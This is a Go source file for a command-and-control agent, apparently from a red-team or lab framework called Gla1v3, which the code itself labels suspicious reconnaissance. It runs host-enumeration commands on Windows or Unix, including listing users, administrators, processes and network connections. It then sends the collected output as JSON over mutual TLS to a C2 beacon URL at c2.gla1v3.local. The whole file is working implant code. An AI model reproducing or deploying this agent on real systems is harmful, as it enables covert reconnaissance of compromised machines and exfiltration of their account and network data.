package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Agent that collects system information (suspicious reconnaissance)
func main() {
	// Load certificates
	certPath := os.Getenv("AGENT_CERT_PATH")
	keyPath := os.Getenv("AGENT_KEY_PATH")
	if certPath == "" {
		certPath = "../../certs/agent-client.crt"
	}
	if keyPath == "" {
		keyPath = "../../certs/agent-client.key"
	}

	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		log.Fatal("Failed to load cert/key:", err)
	}

	caPath := os.Getenv("AGENT_CA_PATH")
	if caPath == "" {
		caPath = "../../certs/ca.crt"
	}

	caCert, err := os.ReadFile(caPath)
	if err != nil {
		log.Fatal("Failed to read CA cert:", err)
	}
	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatal("Failed to append CA cert to pool")
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   "c2.gla1v3.local",
		MinVersion:   tls.VersionTLS12,
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   20 * time.Second,
	}

	agentID := "sysinfo-" + fmt.Sprintf("%d", time.Now().UnixNano())

	log.Printf("Starting system info agent: %s", agentID)

	results := make(map[string]interface{})
	results["agent_type"] = "system-info"
	results["timestamp"] = time.Now().UTC().Format(time.RFC3339)
	results["os"] = runtime.GOOS
	results["arch"] = runtime.GOARCH

	// Collect various system information
	commands := map[string][]string{}
	
	if runtime.GOOS == "windows" {
		commands = map[string][]string{
			"hostname":     {"hostname"},
			"systeminfo":   {"systeminfo"},
			"ipconfig":     {"ipconfig", "/all"},
			"tasklist":     {"tasklist"},
			"netstat":      {"netstat", "-ano"},
			"wmic_os":      {"wmic", "os", "get", "caption,version,buildnumber"},
			"wmic_process": {"wmic", "process", "list", "brief"},
			"net_user":     {"net", "user"},
			"net_localgroup": {"net", "localgroup", "administrators"},
		}
	} else {
		commands = map[string][]string{
			"hostname": {"hostname"},
			"uname":    {"uname", "-a"},
			"ps":       {"ps", "aux"},
			"netstat":  {"netstat", "-tulpn"},
			"whoami":   {"whoami"},
			"id":       {"id"},
		}
	}

	for name, cmdArgs := range commands {
		log.Printf("Running: %s", name)
		cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
		output, err := cmd.CombinedOutput()
		
		result := map[string]interface{}{
			"command": strings.Join(cmdArgs, " "),
			"output":  string(output),
		}
		if err != nil {
			result["error"] = err.Error()
		}
		
		// Truncate large outputs
		if len(result["output"].(string)) > 2048 {
			result["output"] = result["output"].(string)[:2048] + "...(truncated)"
		}
		
		results[name] = result
	}

	// Send results to C2
	payload := map[string]interface{}{
		"agent_id": agentID,
		"output":   fmt.Sprintf("System info collection completed: %d commands", len(commands)),
		"results":  results,
		"ts":       time.Now().UTC().Format(time.RFC3339),
	}

	bodyBytes, _ := json.Marshal(payload)
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "https://c2.gla1v3.local:4443/beacon"
	}

	req, _ := http.NewRequest("POST", c2URL, bytes.NewReader(bodyBytes))
	req.Header.Set("User-Agent", "Gla1v3-SysInfo/0.1")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", agentID)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Failed to send results: %v", err)
	}
	defer resp.Body.Close()

	log.Printf("Results sent: %s", resp.Status)
}
